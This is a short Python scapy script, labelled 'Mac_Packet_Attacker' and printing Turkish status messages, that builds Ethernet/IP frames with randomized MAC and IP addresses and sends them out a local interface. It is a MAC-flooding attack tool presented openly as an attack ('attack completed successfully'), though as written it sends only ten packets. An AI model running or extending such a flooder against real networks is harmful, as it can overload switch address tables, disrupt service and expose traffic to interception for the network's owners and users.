# Mac_Packet_Attacker
from scapy.all import *
from termcolor import colored
from colorama import Fore, Back, Style, init

# Colorama'nın başlatılması
init(autoreset=True)

print(Fore.BLUE + "\n<<< Mac Paket Saldırı Sistemi Aktifleştirildi ! >>>\n")

packet_list = []
for i in range(10):
    srcMac = RandMAC()
    dstMac = RandMAC()
    srcIp = RandIP()
    dstIp = RandIP()
 
    ether = Ether(src=srcMac, dst=dstMac)
    ip = IP(src=srcIp, dst=dstIp)
    pckt = ether / ip
    packet_list.append(pckt)
    print(Fore.RED + "Mac Paket Saldırısı Gönderiliyor!"," >> ",srcMac, ":", srcIp," >> ", dstMac, ":", dstIp, )

sendp(packet_list, iface="eth0", verbose = False)
print(Fore.GREEN  + "Saldırı İşlemi Başarıyla Tamamlandı!")
